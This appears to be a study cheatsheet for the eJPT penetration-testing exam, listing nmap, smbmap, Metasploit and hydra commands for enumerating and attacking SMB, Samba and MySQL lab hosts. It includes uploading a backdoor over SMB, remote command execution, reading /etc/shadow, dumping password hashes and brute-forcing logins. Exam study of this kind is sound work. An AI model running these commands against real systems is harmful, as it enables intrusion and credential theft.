## eJPT-Cheatsheet For Exam/Studying


## NMAP
```
nmap -Pn 127.0.0.1
```
-Pn skip host discovery
-sV is used to determine the application version information
-p- scans all port 
-T4 Fast Scan Makes a lot of noise 
-sU udp scan 

## SMB 
```
nmap -p445 --script smb-protocols IPADDRESS #protocols
nmap -p445 --script smb-security-mode IPADDRESS
nmap -p445 --script smb-enum-sessions IPADDRESS
nmap -p445 --script smb-enum-shares 10.0.17.200
nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200
nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200
nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.2
nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200
nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200
nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200
nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 10.0.17.200

nmap -p445 --script smb-protocols 10.0.28.123
```

## SMBMAP
```
smbmap -u guest -p "" -d . -H 10.0.28.123
smbmap -u administrator -p smbserver_771 -d . -H 10.0.28.123
smbmap -H 10.0.28.123 -u administrator -p smbserver_771 -x 'ipconfig'
smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -L
smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor
smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' -r 'C$'
smbmap -H 10.0.28.123 -u Administrator -p 'smbserver_771' --download 'C$\flag.txt'
```

## SAMBA 
```
nmap -sU --top-ports 25 192.126.66.3
nmap -sV -p 445 192.126.66.3
nmap --script smb-os-discovery.nse -p 445 192.126.66.3
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.126.66.3
exploit
nmap --script smb-os-discovery.nse -p 445 192.126.66.3
nmblookup -A 192.126.66.3
smbclient -L 192.126.66.3 -N
rpcclient -U "" -N 192.126.66.3
```
## MySQL 
```
mysql -h 192.71.145.3 -u root //connect to user account
show databases; show databases
msfconsole
use auxiliary/scanner/mysql/mysql_schemadump
set RHOSTS 192.71.145.3
set USERNAME root
set PASSWORD ""
exploit
use auxiliary/scanner/mysql/mysql_writable_dirs
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set RHOSTS 192.71.145.3
set VERBOSE false
set PASSWORD ""
exploit
use auxiliary/scanner/mysql/mysql_file_enum
set RHOSTS 192.71.145.3
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
set PASSWORD ""
exploit
mysql -h 192.71.145.3 -u root
select load_file("/etc/shadow");
use auxiliary/scanner/mysql/mysql_hashdump
set RHOSTS 192.71.145.3
set USERNAME root
set PASSWORD ""
exploit
nmap --script=mysql-empty-password -p 3306 192.71.145.3
nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
 nmap --script=mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -p 3306 192.71.145.3
nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p 3306 192.71.145.3
```


```
msfconsole
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.149.194.3
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set STOP_ON_SUCCESS true
exploit

hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.149.194.3 mysql

```
